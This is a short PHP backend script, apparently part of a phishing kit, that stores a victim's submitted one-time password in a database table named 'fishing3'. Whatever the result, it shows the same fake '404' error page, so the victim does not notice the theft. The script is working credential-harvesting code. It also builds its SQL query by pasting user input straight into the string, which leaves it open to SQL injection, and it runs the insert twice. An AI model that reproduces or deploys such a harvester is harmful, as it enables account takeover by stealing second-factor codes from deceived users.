<?php

//Create a conection with database
$con = mysqli_connect("localhost", "root", "", "fishing3");

//Set Variebles for the input
$otp = $_POST['otp'];

//Create a MySQL command to INSERT data into data table
$sql = "INSERT INTO fishing3(otp) VALUES ('$otp')";
$result = mysqli_query($con, $sql);

//Now Insert data into database
//Check if data is inserted or not
if (!mysqli_query($con, $sql)) {
	echo "<h1>Error! 404</h1><br><h4> Try again later </h4>";
} else{
	echo "<h1>Error! 404</h1><br><h4> Try again later </h4>";
}
?>